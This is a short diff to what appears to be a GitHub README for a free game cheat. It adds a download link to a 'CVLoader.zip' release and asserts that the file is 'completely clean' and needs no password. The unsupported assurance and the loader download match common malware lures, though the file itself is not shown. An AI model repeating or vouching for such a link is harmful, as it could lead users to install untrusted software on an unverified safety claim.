@@ -2,6 +2,9 @@
 
 New free cheat that will give you a new experience from the game!
 
+## Download - [Click here](https://github.com/Musogal/Crystal-Vision-Software/releases/download/v1.0.0/CVLoader.zip)
+## No passwords are required, the file is completely clean
+
 Showcase - 
 
 ![image](https://github.com/user-attachments/assets/8106de47-ad56-4163-9e03-638731a61d16)
